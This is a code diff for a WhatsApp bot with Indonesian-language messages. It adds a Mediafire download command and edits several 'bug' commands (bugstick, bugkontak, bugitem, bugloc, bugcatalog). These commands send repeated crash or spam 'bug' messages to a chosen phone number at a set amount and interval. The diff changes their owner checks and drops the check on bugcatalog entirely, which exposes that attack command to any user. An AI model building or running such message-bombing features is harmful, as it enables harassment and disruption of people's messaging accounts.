@@ -23,7 +23,8 @@ const { obfus } = require('./scrape/obfuscator')
 const { kusonime } = require('./scrape/kusonime')
 const ms = require('ms')
 const os = require('os')
-const { igdl, wiki, mediafire, tiktok, herodetail, herolist, shoppe, otaku, film, covid, twitter, pinterest, igstory, igstalk, ytdl, fbdown, playstore, lirik, komiku, linkwa, wattpad
+const { mediafire } = require('./scrape/mediafire')
+const { igdl, wiki, tiktok, herodetail, herolist, shoppe, otaku, film, covid, twitter, pinterest, igstory, igstalk, ytdl, fbdown, playstore, lirik, komiku, linkwa, wattpad
 } = require('./lib/main')
 const tt = require('./scrape/tiktok')
 const { xnxxsearch, xnxxdl } = require('./lib/xnxx')
@@ -657,6 +658,31 @@ Selama ${clockString(new Date - user.afkTime)}
 		}
 		
 		switch(command) {
+		case prefix+'mediafire':{
+
+if (!text) return reply(`Link Nya Kak???`)
+if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Contoh ${prefix+command} https://www.mediafire.com/file/uoo686zvjoouwpr/SC_GRUB_OKEP_%255BNO_CURL_S2M%255D.zip/file`)
+const djej = "6281327496283@s.whatsapp.net"
+const zk = await mediafire(`${text}`)
+const mbc = `Nih Kak @${sender.split("@")[0]}\nDownload File Di Atas Yah\n\nUrl : ${zk.url}\nUrl² : ${zk.url2}\nFilename : ${zk.filename}\nFiletype : ${zk.filetype}\nExt : ${zk.ext}\nUpload : ${zk.aploud}\nFilesizeH : ${zk.filesizeH}\nFilesize : ${zk.filesize}`
+let buuttoons = [
+{buttonId: `ngn`, buttonText: {displayText: 'Makasih'}, type: 1}
+]
+let bguttonMessaage = {
+document: { url: zk.url }, 
+fileName: `${zk.filename}`, 
+mimetype: `application/zip`,
+jpegThumbnail: ppnyauser,
+caption: mbc,
+mentions:[sender, djej],
+footer: `_Powered By @${djej.split("@")[0]}_`,
+buttons: buuttoons,
+headerType: 4,
+contextInfo: { "mentionedJid": [sender, djej]
+}}
+alfa.sendMessage(m.chat, bguttonMessaage)
+}
+break
 		case 'neko': case 'gasm': case 'meow': case 'lewd': case 'avatar': case 'wallpaper': case 'v3': case 'goose': {
 		let njas = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
 		console.log(njas)
@@ -5252,8 +5278,8 @@ alfa.relayMessage(m.chat, template.message, { messageId: template.key.id })
 }
 break
 case prefix+'bugstick':{
-addCountCmd(`${command.slice(1)}`, sender, _cmd)
-if (!itsalfa) return
+
+if (!isCreator) return m.reply('Lu Bukan Owner Ya')
 if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
@@ -5266,8 +5292,8 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`
 }
 break
 case prefix+'bugkontak':{
-addCountCmd(`${command.slice(1)}`, sender, _cmd)
-if (!itsalfa) return
+
+if (!isCreator) return m.reply('Lu Bukan Owner Ya')
 if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
@@ -5280,8 +5306,8 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`
 }
 break
 case prefix+'bugitem': {
-addCountCmd(`${command.slice(1)}`, sender, _cmd)
-if (!itsalfa) return
+
+if (!isCreator) return m.reply('Lu Bukan Owner Ya')
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
@@ -5294,8 +5320,8 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`
 }
 break
 case prefix+'bugloc': {
-addCountCmd(`${command.slice(1)}`, sender, _cmd)
-if (!itsalfa) return
+
+if (!isCreator) return m.reply('Lu Bukan Owner Ya')
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
@@ -5321,8 +5347,6 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`
 }
 break
 case prefix+'bugcatalog': {
-addCountCmd(`${command.slice(1)}`, sender, _cmd)
-if (!itsalfa) return
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
